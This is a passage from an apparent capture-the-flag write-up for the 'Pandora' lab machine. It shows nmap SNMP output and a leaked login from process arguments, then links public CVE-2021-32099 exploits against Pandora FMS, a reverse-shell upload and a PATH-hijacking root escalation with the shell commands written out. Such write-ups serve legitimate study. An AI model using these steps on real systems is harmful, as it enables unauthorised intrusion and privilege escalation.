|   linux-headers-5.4.0-74_5.4.0-74.83_all; 2021-06-11T12:44:19
|   linux-headers-5.4.0-91-generic_5.4.0-91.102_amd64; 2022-01-03T07:48:17
|   linux-headers-5.4.0-91_5.4.0-91.102_all; 2022-01-03T07:48:15
|   linux-headers-generic_5.4.0.91.95_amd64; 2022-01-03T07:48:17
|   linux-image-5.4.0-74-generic_5.4.0-74.83_amd64; 2021-06-11T12:43:57
|   linux-image-5.4.0-91-generic_5.4.0-91.102_amd64; 2022-01-03T07:47:58
|   linux-image-generic_5.4.0.91.95_amd64; 2022-01-03T07:48:08
|   linux-modules-5.4.0-74-generic_5.4.0-74.83_amd64; 2021-06-11T12:43:56
|   linux-modules-5.4.0-91-generic_5.4.0-91.102_amd64; 2022-01-03T07:47:56
|   linux-modules-extra-5.4.0-74-generic_5.4.0-74.83_amd64; 2021-06-11T12:44:06
|   linux-modules-extra-5.4.0-91-generic_5.4.0-91.102_amd64; 2022-01-03T07:48:08
|   locales_2.31-0ubuntu9.2_all; 2021-02-01T17:23:45
|   login_1:4.8.1-1ubuntu5.20.04.1_amd64; 2021-12-07T12:56:50
|   logrotate_3.14.0-4ubuntu3_amd64; 2021-02-01T17:22:20
|   logsave_1.45.5-2ubuntu1_amd64; 2021-02-01T17:21:15
|   lsb-base_11.1.0ubuntu2_all; 2021-02-01T17:21:15
|   lsb-release_11.1.0ubuntu2_all; 2021-02-01T17:22:20
|   lshw_02.18.85-0.3ubuntu2.20.04.1_amd64; 2021-02-01T17:25:13
|   lsof_4.93.2+dfsg-1ubuntu0.20.04.1_amd64; 2021-02-01T17:25:13
|   ltrace_0.7.3-6.1ubuntu1_amd64; 2021-02-01T17:25:13
|   lua-lpeg_1.0.2-1_amd64; 2021-06-11T13:30:11
|   lvm2_2.03.07-1ubuntu1_amd64; 2021-02-01T17:25:55
|   lxd-agent-loader_0.4_all; 2021-02-01T17:25:55
|   lz4_1.9.2-2ubuntu0.20.04.1_amd64; 2021-06-11T12:47:35
|   man-db_2.9.1-1_amd64; 2021-02-01T17:24:52
|   manpages_5.05-1_all; 2021-02-01T17:25:14
|   mariadb-client-10.3_1:10.3.32-0ubuntu0.20.04.1_amd64; 2021-12-07T12:57:11
|   mariadb-client-core-10.3_1:10.3.32-0ubuntu0.20.04.1_amd64; 2021-12-07T12:57:10
|   mariadb-common_1:10.3.32-0ubuntu0.20.04.1_all; 2021-12-07T12:57:07
|   mariadb-server-10.3_1:10.3.32-0ubuntu0.20.04.1_amd64; 2021-12-07T12:57:14
|   mariadb-server-core-10.3_1:10.3.32-0ubuntu0.20.04.1_amd64; 2021-12-07T12:57:09
|   mariadb-server_1:10.3.32-0ubuntu0.20.04.1_all; 2021-12-07T12:57:58
|   mawk_1.3.4.20200120-2_amd64; 2021-02-01T17:21:15
|   mdadm_4.1-5ubuntu1.2_amd64; 2021-02-01T17:25:56
|   mime-support_3.64ubuntu1_all; 2021-02-01T17:22:20
|   motd-news-config_11ubuntu5.4_all; 2021-12-07T12:56:49
|   mount_2.34-0.1ubuntu9.1_amd64; 2021-02-01T17:23:57
|   mtr-tiny_0.93-1_amd64; 2021-02-01T17:25:14
|   multipath-tools_0.8.3-1ubuntu2_amd64; 2021-02-01T17:26:17
|   mysql-common_5.8+1.0.5ubuntu2_all; 2021-06-11T13:30:07
|   nano_4.8-1ubuntu1_amd64; 2021-02-01T17:25:14
|   ncurses-base_6.2-0ubuntu2_all; 2021-02-01T17:21:16
|   ncurses-bin_6.2-0ubuntu2_amd64; 2021-02-01T17:21:16
|   ncurses-term_6.2-0ubuntu2_all; 2021-06-11T12:45:36
|   net-tools_1.60+git20180626.aebd88e-1ubuntu1_amd64; 2021-11-23T11:48:05
|   netbase_6.1_all; 2021-02-01T17:22:20
|   netcat-openbsd_1.206-1ubuntu1_amd64; 2021-02-01T17:22:20
|   networkd-dispatcher_2.1-2~ubuntu20.04.1_all; 2021-12-07T12:57:18
|   nmap-common_7.80+dfsg1-2build1_all; 2021-06-11T13:30:11
|   nmap_7.80+dfsg1-2build1_amd64; 2021-06-11T13:30:11
|   ntfs-3g_1:2017.3.23AR.3-3ubuntu1.1_amd64; 2021-12-07T12:57:03
|   open-iscsi_2.0.874-7.1ubuntu6.2_amd64; 2021-06-11T13:05:04
|   open-vm-tools_2:11.3.0-2ubuntu0~ubuntu20.04.2_amd64; 2021-12-07T12:57:18
|   openssh-client_1:8.2p1-4ubuntu0.3_amd64; 2021-12-07T12:57:25
|   openssh-server_1:8.2p1-4ubuntu0.3_amd64; 2021-12-07T12:57:23
|   openssh-sftp-server_1:8.2p1-4ubuntu0.3_amd64; 2021-12-07T12:57:22
|   openssl_1.1.1f-1ubuntu2.10_amd64; 2022-01-03T07:47:21
|   os-prober_1.74ubuntu2_amd64; 2021-06-11T12:44:22
|   overlayroot_0.45ubuntu2_all; 2021-12-07T12:58:00
|   packagekit-tools_1.1.13-2ubuntu1.1_amd64; 2021-02-01T17:25:57
|   packagekit_1.1.13-2ubuntu1.1_amd64; 2021-02-01T17:25:57
|   packages-microsoft-prod_1.0-ubuntu20.04.1_all; 2021-06-11T20:06:04
|   parted_3.3-4ubuntu0.20.04.1_amd64; 2021-02-01T17:25:15
|   passwd_1:4.8.1-1ubuntu5.20.04.1_amd64; 2021-12-07T12:57:11
|   pastebinit_1.5.1-1_all; 2021-02-01T17:25:57
|   patch_2.7.6-6_amd64; 2021-02-01T17:25:02
|   pci.ids_0.0~2020.03.20-1_all; 2021-02-01T17:25:11
|   pciutils_1:3.6.4-1ubuntu0.20.04.1_amd64; 2021-06-11T13:05:09
|   perl-base_5.30.0-9ubuntu0.2_amd64; 2021-02-01T17:23:40
|   perl-modules-5.30_5.30.0-9ubuntu0.2_all; 2021-02-01T17:24:58
|   perl-openssl-defaults_4_amd64; 2021-06-11T13:30:08
|   perl_5.30.0-9ubuntu0.2_amd64; 2021-02-01T17:25:01
|   php-bcmath_2:7.4+75_all; 2021-06-11T13:33:42
|   php-cli_2:7.4+75_all; 2021-06-11T13:33:42
|   php-common_2:75_all; 2021-06-11T13:33:40
|   php-curl_2:7.4+75_all; 2021-06-11T13:33:42
|   php-db_1.9.3-1build1_all; 2021-06-11T13:33:42
|   php-gd_2:7.4+75_all; 2021-06-11T13:33:42
|   php-gmp_2:7.4+75_all; 2021-06-11T13:33:42
|   php-ldap_2:7.4+75_all; 2021-06-11T13:33:42
|   php-mbstring_2:7.4+75_all; 2021-06-11T13:33:43
|   php-mysql_2:7.4+75_all; 2021-06-11T13:33:43
|   php-pear_1:1.10.9+submodules+notgz-1ubuntu0.20.04.3_all; 2021-12-07T12:57:58
|   php-snmp_2:7.4+75_all; 2021-06-11T13:33:43
|   php-sqlite3_2:7.4+75_all; 2021-06-11T13:33:43
|   php-xml_2:7.4+75_all; 2021-06-11T13:33:42
|   php-xmlrpc_2:7.4+75_all; 2021-06-11T13:33:43
|   php-zip_2:7.4+75_all; 2021-06-11T13:33:44
|   php7.4-bcmath_7.4.3-4ubuntu2.8_amd64; 2022-01-03T07:47:23
|   php7.4-cli_7.4.3-4ubuntu2.8_amd64; 2022-01-03T07:47:27
|   php7.4-common_7.4.3-4ubuntu2.8_amd64; 2022-01-03T07:47:28
|   php7.4-curl_7.4.3-4ubuntu2.8_amd64; 2022-01-03T07:47:26
|   php7.4-gd_7.4.3-4ubuntu2.8_amd64; 2022-01-03T07:47:26
|   php7.4-gmp_7.4.3-4ubuntu2.8_amd64; 2022-01-03T07:47:25
|   php7.4-json_7.4.3-4ubuntu2.8_amd64; 2022-01-03T07:47:25
|   php7.4-ldap_7.4.3-4ubuntu2.8_amd64; 2022-01-03T07:47:25
|   php7.4-mbstring_7.4.3-4ubuntu2.8_amd64; 2022-01-03T07:47:23
|   php7.4-mysql_7.4.3-4ubuntu2.8_amd64; 2022-01-03T07:47:25
|   php7.4-opcache_7.4.3-4ubuntu2.8_amd64; 2022-01-03T07:47:25
|   php7.4-readline_7.4.3-4ubuntu2.8_amd64; 2022-01-03T07:47:24
|   php7.4-snmp_7.4.3-4ubuntu2.8_amd64; 2022-01-03T07:47:24
|   php7.4-sqlite3_7.4.3-4ubuntu2.8_amd64; 2022-01-03T07:47:24
|   php7.4-xml_7.4.3-4ubuntu2.8_amd64; 2022-01-03T07:47:24
|   php7.4-xmlrpc_7.4.3-4ubuntu2.8_amd64; 2022-01-03T07:47:23
|   php7.4-zip_7.4.3-4ubuntu2.8_amd64; 2022-01-03T07:47:23
|   php7.4_7.4.3-4ubuntu2.8_all; 2022-01-03T07:48:17
|   php_2:7.4+75_all; 2021-06-11T13:33:42
|   pinentry-curses_1.1.0-3build1_amd64; 2021-02-01T17:25:37
|   plymouth-theme-ubuntu-text_0.9.4git20200323-0ubuntu6.2_amd64; 2021-02-01T17:25:15
|   plymouth_0.9.4git20200323-0ubuntu6.2_amd64; 2021-02-01T17:25:15
|   policykit-1_0.105-26ubuntu1.1_amd64; 2021-06-11T12:48:24
|   pollinate_4.33-3ubuntu1.20.04.1_all; 2021-06-11T13:05:12
|   popularity-contest_1.69ubuntu1_all; 2021-02-01T17:24:53
|   powermgmt-base_1.36_all; 2021-02-01T17:25:15
|   powershell_7.1.3-1.ubuntu.20.04_amd64; 2021-06-11T20:25:49
|   procps_2:3.3.16-1ubuntu2.3_amd64; 2021-12-07T12:57:07
|   psmisc_23.3-1_amd64; 2021-02-01T17:25:16
|   publicsuffix_20200303.0012-1_all; 2021-02-01T17:25:16
|   python-apt-common_2.0.0ubuntu0.20.04.6_all; 2021-12-07T12:57:14
|   python3-apport_2.20.11-0ubuntu27.21_all; 2021-12-07T12:57:28
|   python3-apt_2.0.0ubuntu0.20.04.6_amd64; 2021-12-07T12:57:15
|   python3-attr_19.3.0-2_all; 2021-02-01T17:25:45
|   python3-automat_0.8.0-1ubuntu1_all; 2021-02-01T17:25:45
|   python3-blinker_1.4+dfsg1-0.3ubuntu1_all; 2021-02-01T17:25:22
|   python3-certifi_2019.11.28-1_all; 2021-02-01T17:25:19
|   python3-cffi-backend_1.14.0-1build1_amd64; 2021-02-01T17:22:21
|   python3-chardet_3.0.4-4build1_all; 2021-02-01T17:25:01
|   python3-click_7.0-3_all; 2021-02-01T17:25:58
|   python3-colorama_0.4.3-1build1_all; 2021-02-01T17:25:57
|   python3-commandnotfound_20.04.4_all; 2021-02-01T17:25:08
|   python3-configobj_5.0.6-4_all; 2021-02-01T17:25:48
|   python3-constantly_15.1.0-1build1_all; 2021-02-01T17:25:45
|   python3-cryptography_2.8-3ubuntu0.1_amd64; 2021-02-01T17:25:21
|   python3-dbus_1.2.16-1build1_amd64; 2021-02-01T17:22:22
|   python3-debconf_1.5.73_all; 2021-02-01T17:25:01
|   python3-debian_0.1.36ubuntu1_all; 2021-02-01T17:25:01
|   python3-distro-info_0.23ubuntu1_all; 2021-02-01T17:25:02
|   python3-distro_1.4.0-1_all; 2021-02-01T17:25:22
|   python3-distupgrade_1:20.04.36_all; 2021-12-07T12:57:15
|   python3-distutils_3.8.10-0ubuntu1~20.04_all; 2021-06-11T12:47:48
|   python3-entrypoints_0.3-2ubuntu1_all; 2021-02-01T17:25:21
|   python3-gdbm_3.8.10-0ubuntu1~20.04_amd64; 2021-06-11T12:46:35
|   python3-gi_3.36.0-1_amd64; 2021-02-01T17:22:22
|   python3-hamcrest_1.9.0-3_all; 2021-02-01T17:25:47
|   python3-httplib2_0.14.0-1ubuntu1_all; 2021-02-01T17:25:19
|   python3-hyperlink_19.0.0-1_all; 2021-02-01T17:25:46
|   python3-idna_2.8-1_all; 2021-02-01T17:25:20
|   python3-incremental_16.10.1-3.2_all; 2021-02-01T17:25:46
|   python3-json-pointer_2.0-0ubuntu1_all; 2021-12-07T13:01:23
|   python3-jsonpatch_1.23-3_all; 2021-12-07T13:01:23
|   python3-jsonschema_3.2.0-0ubuntu2_all; 2021-12-07T13:01:23
|   python3-jwt_1.7.1-2ubuntu2_all; 2021-02-01T17:25:22
|   python3-keyring_18.0.1-2ubuntu1_all; 2021-02-01T17:25:21
|   python3-launchpadlib_1.10.13-1_all; 2021-02-01T17:25:22
|   python3-lazr.restfulclient_0.14.2-2build1_all; 2021-02-01T17:25:22
|   python3-lazr.uri_1.0.3-4build1_all; 2021-02-01T17:25:21
|   python3-lib2to3_3.8.10-0ubuntu1~20.04_all; 2021-06-11T12:47:48
|   python3-minimal_3.8.2-0ubuntu2_amd64; 2021-02-01T17:21:56
|   python3-nacl_1.3.0-5_amd64; 2021-02-01T17:22:22
|   python3-netifaces_0.10.4-1ubuntu4_amd64; 2021-02-01T17:22:22
|   python3-newt_0.52.21-4ubuntu2_amd64; 2021-02-01T17:25:24
|   python3-oauthlib_3.1.0-1ubuntu2_all; 2021-02-01T17:25:22
|   python3-openssl_19.0.0-1build1_all; 2021-02-01T17:25:46
|   python3-pexpect_4.6.0-1build1_all; 2021-02-01T17:26:01
|   python3-pkg-resources_45.2.0-1_all; 2021-02-01T17:22:22
|   python3-problem-report_2.20.11-0ubuntu27.21_all; 2021-12-07T12:57:27
|   python3-ptyprocess_0.6.0-1ubuntu1_all; 2021-02-01T17:26:01
|   python3-pyasn1-modules_0.2.1-0.2build1_all; 2021-02-01T17:25:46
|   python3-pyasn1_0.4.2-3build1_all; 2021-02-01T17:25:46
|   python3-pymacaroons_0.13.0-3_all; 2021-02-01T17:22:23
|   python3-requests-unixsocket_0.2.0-2_all; 2021-02-01T17:25:20
|   python3-requests_2.22.0-2ubuntu1_all; 2021-02-01T17:25:20
|   python3-secretstorage_2.3.1-2ubuntu1_all; 2021-02-01T17:25:21
|   python3-serial_3.4-5.1_all; 2021-02-01T17:26:01
|   python3-service-identity_18.1.0-5build1_all; 2021-02-01T17:25:47
|   python3-setuptools_45.2.0-1_all; 2021-02-01T17:26:00
|   python3-simplejson_3.16.0-2ubuntu2_amd64; 2021-02-01T17:25:21
|   python3-six_1.14.0-2_all; 2021-02-01T17:22:23
|   python3-software-properties_0.99.9.8_all; 2021-12-07T12:57:59
|   python3-systemd_234-3build2_amd64; 2021-02-01T17:26:02
|   python3-twisted-bin_18.9.0-11ubuntu0.20.04.1_amd64; 2021-06-11T13:05:09
|   python3-twisted_18.9.0-11ubuntu0.20.04.1_all; 2021-06-11T13:05:11
|   python3-update-manager_1:20.04.10.9_all; 2021-12-07T12:57:15
|   python3-urllib3_1.25.8-2ubuntu0.1_all; 2021-02-01T17:25:20
|   python3-wadllib_1.3.3-3build1_all; 2021-02-01T17:25:21
|   python3-yaml_5.3.1-1ubuntu0.1_amd64; 2021-06-11T12:48:37
|   python3-zope.interface_4.7.1-1_amd64; 2021-02-01T17:25:46
|   python3.8-minimal_3.8.10-0ubuntu1~20.04.2_amd64; 2022-01-03T07:47:21
|   python3.8_3.8.10-0ubuntu1~20.04.2_amd64; 2022-01-03T07:47:20
|   python3_3.8.2-0ubuntu2_amd64; 2021-02-01T17:22:21
|   readline-common_8.0-4_all; 2021-02-01T17:22:24
|   rsync_3.1.3-8ubuntu0.1_amd64; 2021-12-07T12:57:03
|   rsyslog_8.2001.0-1ubuntu1.1_amd64; 2021-02-01T17:24:06
|   run-one_1.17-0ubuntu1_all; 2021-02-01T17:26:02
|   sbsigntool_0.9.2-2ubuntu1_amd64; 2021-02-01T17:26:02
|   screen_4.8.0-1ubuntu0.1_amd64; 2021-06-11T12:47:28
|   secureboot-db_1.5_amd64; 2021-02-01T17:26:03
|   sed_4.7-1_amd64; 2021-02-01T17:21:19
|   sensible-utils_0.0.12+nmu1_all; 2021-02-01T17:21:19
|   sg3-utils-udev_1.44-1ubuntu2_all; 2021-02-01T17:26:04
|   sg3-utils_1.44-1ubuntu2_amd64; 2021-02-01T17:26:03
|   shared-mime-info_1.15-1_amd64; 2021-02-01T17:22:24
|   snmp-mibs-downloader_1.2_all; 2021-06-11T19:44:19
|   snmp_5.8+dfsg-2ubuntu2.3_amd64; 2021-06-11T13:30:10
|   snmpd_5.8+dfsg-2ubuntu2.3_amd64; 2021-06-11T13:30:10
|   socat_1.7.3.3-2_amd64; 2021-06-11T13:33:34
|   software-properties-common_0.99.9.8_all; 2021-12-07T12:57:58
|   sosreport_4.1-1ubuntu0.20.04.3_amd64; 2021-12-07T12:57:59
|   sound-theme-freedesktop_0.8-2ubuntu1_all; 2021-02-01T17:25:51
|   ssh-import-id_5.10-0ubuntu1_all; 2021-06-11T19:44:20
|   ssl-cert_1.0.39_all; 2021-06-11T13:31:28
|   strace_5.5-3ubuntu1_amd64; 2021-02-01T17:25:17
|   sudo_1.8.31-1ubuntu1.2_amd64; 2021-02-01T17:24:12
|   systemd-sysv_245.4-4ubuntu3.13_amd64; 2021-12-07T12:56:52
|   systemd-timesyncd_245.4-4ubuntu3.13_amd64; 2021-12-07T12:56:53
|   systemd_245.4-4ubuntu3.13_amd64; 2021-12-07T12:56:57
|   sysvinit-utils_2.96-2.1ubuntu1_amd64; 2021-02-01T17:21:20
|   tar_1.30+dfsg-7ubuntu0.20.04.1_amd64; 2021-02-01T17:23:40
|   tcpdump_4.9.3-4_amd64; 2021-02-01T17:25:17
|   telnet_0.17-41.2build1_amd64; 2021-02-01T17:25:17
|   thermald_1.9.1-1ubuntu0.6_amd64; 2021-12-07T12:58:00
|   thin-provisioning-tools_0.8.5-4build1_amd64; 2021-02-01T17:26:16
|   time_1.7-25.1build1_amd64; 2021-02-01T17:25:17
|   tmux_3.0a-2ubuntu0.3_amd64; 2021-06-11T13:05:19
|   tpm-udev_0.4_all; 2021-02-01T17:25:39
|   traceroute_1:2.1.0-2_amd64; 2021-06-11T13:30:10
|   tzdata_2021e-0ubuntu0.20.04_all; 2021-12-07T12:57:04
|   ubuntu-advantage-tools_27.4.2~20.04.1_amd64; 2022-01-03T07:47:22
|   ubuntu-keyring_2020.02.11.4_all; 2021-06-11T13:05:03
|   ubuntu-release-upgrader-core_1:20.04.36_all; 2021-12-07T12:57:15
|   ubuntu-server_1.450.2_amd64; 2021-02-01T17:26:22
|   ucf_3.0038+nmu1_all; 2021-02-01T17:22:27
|   udev_245.4-4ubuntu3.13_amd64; 2021-12-07T12:56:52
|   udisks2_2.8.4-1ubuntu2_amd64; 2022-01-03T07:48:17
|   unzip_6.0-25ubuntu1_amd64; 2021-06-11T13:33:44
|   update-manager-core_1:20.04.10.9_all; 2021-12-07T12:57:15
|   update-notifier-common_3.192.30.10_all; 2022-01-03T07:47:21
|   upower_0.99.11-1build2_amd64; 2021-06-11T12:44:22
|   usb.ids_2020.03.19-1_all; 2021-02-01T17:25:17
|   usbmuxd_1.1.1~git20191130.9af2b12-1_amd64; 2021-06-11T12:44:22
|   usbutils_1:012-2_amd64; 2021-02-01T17:25:17
|   util-linux_2.34-0.1ubuntu9.1_amd64; 2021-02-01T17:23:43
|   uuid-runtime_2.34-0.1ubuntu9.1_amd64; 2021-02-01T17:24:54
|   vim-common_2:8.1.2269-1ubuntu5.4_all; 2021-12-07T12:57:21
|   vim-runtime_2:8.1.2269-1ubuntu5.4_all; 2021-12-07T12:57:21
|   vim-tiny_2:8.1.2269-1ubuntu5.4_amd64; 2021-12-07T12:57:19
|   vim_2:8.1.2269-1ubuntu5.4_amd64; 2021-12-07T12:57:19
|   wget_1.20.3-1ubuntu2_amd64; 2021-12-07T12:57:25
|   whiptail_0.52.21-4ubuntu2_amd64; 2021-02-01T17:22:28
|   wireless-regdb_2021.08.28-0ubuntu1~20.04.1_all; 2021-12-07T12:58:00
|   x11-common_1:7.7+19ubuntu14_all; 2021-06-11T13:33:39
|   xauth_1:1.1-0ubuntu1_amd64; 2021-02-01T17:25:18
|   xdg-user-dirs_0.17-2ubuntu1_amd64; 2021-02-01T17:22:29
|   xfsprogs_5.3.0-1ubuntu2_amd64; 2021-02-01T17:26:22
|   xkb-data_2.29-2_all; 2021-02-01T17:22:29
|   xprobe_0.3-4build1_amd64; 2021-06-11T13:30:10
|   xxd_2:8.1.2269-1ubuntu5.4_amd64; 2021-12-07T12:57:18
|   xz-utils_5.2.4-1ubuntu1_amd64; 2021-02-01T17:24:13
|   zerofree_1.1.1-1_amd64; 2021-02-01T17:26:25
|   zip_3.0-11build1_amd64; 2021-06-11T13:55:09
|_  zlib1g_1:1.2.11.dfsg-2ubuntu1.2_amd64; 2021-02-01T17:24:00
| snmp-interfaces:
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Status: up
|     Traffic stats: 14.91 Mb sent, 14.91 Mb received
|   VMware VMXNET3 Ethernet Controller
|     IP address: 10.10.11.136  Netmask: 255.255.254.0
|     MAC address: 00:50:56:b9:69:3b (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Status: up
|_    Traffic stats: 685.11 Mb sent, 49.73 Mb received
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 48fa95537765c36000000000
|   snmpEngineBoots: 30
|_  snmpEngineTime: 58m37s
| snmp-sysdescr: Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
|_  System uptime: 58m37.54s (351754 timeticks)
| snmp-netstat:
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  10.10.11.136:22      10.10.14.15:60698
|   TCP  10.10.11.136:22      10.10.14.35:57916
|   TCP  10.10.11.136:22      10.10.14.75:39672
|   TCP  10.10.11.136:36786   10.10.14.15:1234
|   TCP  10.10.11.136:39306   1.1.1.1:53
|   TCP  127.0.0.1:3306       0.0.0.0:0
|   TCP  127.0.0.53:53        0.0.0.0:0
|   UDP  0.0.0.0:161          *:*
|_  UDP  127.0.0.53:53        *:*
Service Info: Host: pandora

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 15 17:39:02 2022 -- 1 IP address (1 host up) scanned in 1586.77 seconds
```

We see SNMP is running. Among the running processes, 2 have interesting arguments.

```
|   829:
|     Name: sh
|     Path: /bin/sh
|     Params: -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'
```

```
|   1152:
|     Name: host_check
|     Path: /usr/bin/host_check
|     Params: -u daniel -p HotelBabylon23
```

Using the found credentials, we can SSH in as daniel.

Checking daniel's `sudo` privileges ...

```sh
daniel@pandora:~$ sudo -l
[sudo] password for daniel:
Sorry, user daniel may not run sudo on pandora.
```

We can't run `sudo` so we'll have to find another way to privesc. Looking at `/home` and `/etc/passwd`, we see that we have another user we might need to privesc to: matt.

Checking listening ports ...

```sh
daniel@pandora:~$ ss -tlnp
State        Recv-Q        Send-Q               Local Address:Port               Peer Address:Port       Process
LISTEN       0             4096                 127.0.0.53%lo:53                      0.0.0.0:*
LISTEN       0             128                        0.0.0.0:22                      0.0.0.0:*
LISTEN       0             80                       127.0.0.1:3306                    0.0.0.0:*
LISTEN       0             128                           [::]:22                         [::]:*
LISTEN       0             511                              *:80                            *:*
```

We have port 80 which we can forward with SSH.

```sh
ssh daniel@panda.htb -L 8080:localhost:80 -N
```

Going to the site, we see a login page using Pandora FMS. Furthermore, looking at the page's source code, we see the version string `v7.0NG.742_FIX_PERL2020`. We can also see this version string in `/var/www/pandora/pandora_console/include/config_process.php`. In looking for exploits for Pandora FMS, I found [OpenCVE](https://www.opencve.io/cve) and searched for [exploits with critical CVSS scores](https://www.opencve.io/cve?vendor=artica&product=pandora_fms&cvss=critical&search=). Among the 4 resulting vulnerabilities, I found [this exploit using CVE-2021-32099](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated) to work and got command execution as `matt` on the machine. However, the RCE shell was very limited in functionality and I couldn't get a reverse shell at all. Trying to upload and use my own SSH key didn't work either as I kept getting asked for matt's password which I didn't have.

Looking up `CVE-2021-32099 github`, I found [another PoC](https://github.com/zjicmDarkWing/CVE-2021-32099) which simply logs us in as an admin. After logging in, we can go to Admin tools, File manager.

Here, we can upload files to `/pandora_console/images/`. We can simply upload a reverse shell and navigate to that file and get a shell as matt.

Looking for SUID files ...

```sh
matt@pandora:/home/matt$ find / -perm -4000 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1

matt@pandora:/tmp$ ls -l /usr/bin/pandora_backup
-rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup
```

... we see that `/usr/bin/pandora_backup` stands out like a sore thumb. I couldn't analyze it on the target machine since it doesn't even have `strings` so I downloaded to my local machine and did some simple analysis. Checking out static strings (can also be done with `strings`) ...

```sh
$ rabin2 -z pandora_backup
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00002008 0x00002008 25  26   .rodata ascii PandoraFMS Backup Utility
1   0x00002028 0x00002028 42  43   .rodata ascii Now attempting to backup PandoraFMS client
2   0x00002058 0x00002058 79  80   .rodata ascii tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
3   0x000020a8 0x000020a8 38  39   .rodata ascii Backup failed!\nCheck your permissions!
4   0x000020cf 0x000020cf 18  19   .rodata ascii Backup successful!
5   0x000020e2 0x000020e2 20  21   .rodata ascii Terminating program!
```

... we see that `tar` is being run with a wildcard. My first thought was to use the wildcard, but I noticed that `tar` is being run without a full absolute path, so I went for `PATH` hijacking.

```sh
matt@pandora:/tmp$ echo -e '#!/bin/bash\nid\n/bin/bash -p' > tar
matt@pandora:/tmp$ chmod +x tar
matt@pandora:/tmp$ export PATH=".:$PATH"
matt@pandora:/tmp$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
uid=1000(matt) gid=1000(matt) groups=1000(matt)
matt@pandora:/tmp$
```

We're unable to use the SUID bit for some unknown reason, though we know `PATH` hijacking works since we have `id`'s output. Moving on, I tried checking `sudo -l`.

```sh
matt@pandora:/home/matt$ sudo -l
sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: unable to initialize policy plugin
```

We're unable to run `sudo` for another unfamiliar reason.
Looking up the error didn't help much.
After asking around, I learned that [this bug](https://lists.debian.org/debian-apache/2015/11/msg00022.html) was used.
The bug says that SUID binaries might not work with `apache2-mpm-itk` and `file_get_contents`.
Since we got the shell through exploiting the Apache web server, that's probably why the SUID bit isn't working.
To get around this, I tried to get an SSH key.
After previously failing to use SSH, I asked around and got a hint that I'd need to also set the correct permissions for `.ssh` and `authorized_key`.
This was probably why just uploading my SSH key after getting a shell with `CVE-2021-32099` didn't work.

```sh
chmod 600 /home/matt/.ssh/authorized_key
chmod 700 /home/matt/.ssh
```

With all that set up, we should be able to SSH in as matt. After that, follow the steps to use `PATH` hijacking on `tar` and `/usr/bin/pandora_backup` as before to get a shell as root.
